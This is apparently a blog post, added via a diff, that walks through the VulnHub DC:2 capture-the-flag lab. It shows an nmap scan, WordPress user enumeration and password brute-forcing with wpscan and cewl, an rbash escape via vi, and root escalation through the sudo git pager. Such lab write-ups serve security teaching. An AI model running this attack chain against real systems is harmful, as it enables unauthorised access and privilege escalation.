@@ -1,0 +1,286 @@
+---
+title: "VulnHub | DC: 2 - Writeup"
+excerpt: Writeup for DC:2 of DC series from VulnHub
+date: 2019-07-12 00:00:00
+categories: [cybersec, infosec, vulnhub]
+tags: [dc, local privilege escalation, rbash, wordpress]
+---
+
+## Information
+DC: 1 is the second box on the VulnHub series *DC* by [DCAU][DCAU]. It starts off with a simple Wordpress website and 
+moves on to escaping `rbash` on a `SSH`. There are five flags available but flags 1 through 4 exist to give you hints 
+on what to do next to capture the next flag. As a result, this writeup will only talk about how to capture the root 
+flag only.
+
+## Tasks
+- Capture the root flag
+ 
+## Summary
+- Use `nmap` to see the services
+- Use `wpscan` to find any and all vulnerabilities in the Wordpress installation and to enumerate possible usernames
+- Use `cewl` to make a wordlist for `wpscan` brute-force the usernames found in the previous `wpscan`
+- Use `vi` and `export PATH` to escape `rbash`
+- Use `git`s `GTFOBin` to access escalate privileges to `root`
+ 
+## Tools Used
+- `nmap`
+- `wpscan`
+- `cewl`
+- `ssh`
+- `vi`
+- `LinEnum`
+- `git`
+
+## Walkthrough
+### nmap
+We start off with a basic `nmap` scan.
+
+```
+$ nmap -sC -sV 192.168.2.190
+
+[...]
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.7.10
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: DC-2 &#8211; Just another WordPress site
+7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
+|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
+|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
+|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
+MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[...]
+```
+
+`nmap` shows that we have `HTTP` on Port 80 and `SSH` on Port 7744.
+
+### Wordpress
+Visiting `192.168.2.190` redirects us to `http://dc-2/` and we're greeted with a Wordpress website
+
+![Wordpress - Homepage][Wordpress - Homepage]
+
+There isn't anything of use in the website aside `Flag` page but as stated previously, that'll be disregarded. As a 
+result we'll be using `wpscan` to check for vulnerabilities in the system while enumerating for possible usernames.
+
+```
+$ wpscan --url http://dc-2/ -e u
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://dc-2/
+
+Interesting Finding(s):
+
+[+] http://dc-2/
+[...]
+
+[+] http://dc-2/xmlrpc.php
+[...]
+
+[+] http://dc-2/readme.html
+[...]
+
+[+] http://dc-2/wp-cron.php
+[...]
+
+[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
+[...]
+
+[+] WordPress theme in use: twentyseventeen
+[...]
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+Brute Forcing Author IDs - Time: 00:00:01 <========================================> (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] admin
+| Detected By: Rss Generator (Passive Detection)
+| Confirmed By:
+|  Wp Json Api (Aggressive Detection)
+|   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+|  Login Error Messages (Aggressive Detection)
+
+[+] jerry
+| Detected By: Wp Json Api (Aggressive Detection)
+|  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+| Confirmed By:
+|  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+|  Login Error Messages (Aggressive Detection)
+
+[+] tom
+| Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+| Confirmed By: Login Error Messages (Aggressive Detection)
+
+[...]
+```
+
+`wpscan` found 3 users; `admin`, `jerry` and `tom`. After putting these 3 usernames to `usernames.txt`, we'll use 
+`cewl` to generate ourselves a wordlist to use to brute-force these 3 users. 
+
+```
+$ cewl http://dc-2/ -w cewl.txt
+
+$ wpscan --url http://dc-2/ --passwords cewl.txt --usernames usernames.txt
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[...]
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+Checking Config Backups - Time: 00:00:00 <========================================> (21 / 21) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 3 user/s
+[SUCCESS] - jerry / adipiscing                                                                                                                                                           
+[SUCCESS] - tom / parturient                                                                                                                                                             
+Trying admin / find Time: 00:00:45 <========================================> (645 / 645) 100.00% Time: 00:00:45
+Trying admin / log Time: 00:00:45 <========================================> (645 / 645) 100.00% Time: 00:00:45
+
+[i] Valid Combinations Found:
+| Username: jerry, Password: adipiscing
+| Username: tom, Password: parturient
+```
+
+`wpscan` found `jerry`'s password to be `adipiscing` and `tom`'s password to be `parturient`. Logging in to Wordpress 
+with these credentials reveals that they're not admins, thus nothing useful can be done with their privileges; like 
+editing a page to implement a reverse shell. As a result we'll try these credentials in `SSH`.
+
+### SSH
+When attempted to use the same passwords in `SSH` we can't login as `jerry` but we can as `tom`. By logging in, we're 
+placed in a restricted bash (or better known as `rbash`) where we're jailed with limited commands and tools accessible 
+to us.
+
+```
+$ ssh jerry@192.168.2.190 -p 7744
+jerry@192.168.2.190's password:
+Permission denied, please try again.
+
+$ ssh tom@192.168.2.190 -p 7744
+tom@192.168.2.190's password:
+
+tom@DC-2:~$ cd /tmp
+-rbash: cd: restricted
+
+tom@DC-2:~$ echo $SHELL
+/bin/rbash
+```
+
+To escape `rbash` we have to use `vim`; where we can run scripts and commands to escape the shell. But in our system we 
+have `vi` instead of `vim`.
+
+```
+tom@DC-2:~$ vi
+::set shell=/bin/sh
+::shell
+
+tom@DC-2:~$ cd /tmp
+tom@DC-2:~$ pwd
+/tmp
+
+tom@DC-2:~$ whoami
+/bin/sh: 1: whoami not found
+```
+
+Now that we have a less restrictive shell where we can use `/`'s we can spawn a proper shell using the following 
+`export PATH` command where it will look for said binary.
+
+```
+$ export PATH=/home/Arszilla/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin
+
+$ whoami
+tom
+```
+
+Using [this][GTFOBin] `GTFOBin` we'll exploit `git` allow us to levitate our privileges to `root`. But to run that we 
+need to be `sudoer`; which `tom` isn't. As a result we'll attempt to login as `jerry` with the Wordpress password we 
+got earlier and attempt to run the `GTFOBin` again.
+
+```
+$ sudo git -p help config
+[sudo] password for tom: 
+tom is not in the sudoers file.  This incident will be reported.
+
+$ su - jerry
+Password:
+
+jerry@DC-2:~$ sudo git -p help config
+GIT-CONFIG(1)                                 Git Manual                                GIT-CONFIG(1)
+
+NAME
+       git-config - Get and set repository or global options
+
+SYNOPSIS
+       
+       [...]
+
+DESCRIPTION
+
+       [...]
+
+!/bin/sh
+
+# cd /root
+
+# ls -la
+total 32
+drwx------  2 root root 4096 Mar 21 21:42 .
+drwxr-xr-x 21 root root 4096 Mar 10 01:17 ..
+-rw-------  1 root root  207 Mar 21 21:42 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  427 Mar 21 19:55 final-flag.txt
+-rw-------  1 root root   46 Mar 21 20:09 .lesshst
+-rw-------  1 root root  232 Mar 21 17:15 .mysql_history
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+
+# cat final-flag.txt
+__    __     _ _       _                    _
+/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
+\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
+\  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
+  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   
+
+Congratulatons!!!
+
+A special thanks to all those who sent me tweets
+and provided me with feedback - it's all greatly
+appreciated.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+```
+
+And by that, we've captured the `root` flag.
+
+[DCAU]: https://twitter.com/DCAU7
+[Wordpress - Homepage]: /images/posts/2019-07-12-vulnhub-dc_2/Wordpress%20-%20Homepage.png
+[GTFOBin]: https://gtfobins.github.io/gtfobins/git/#sudo
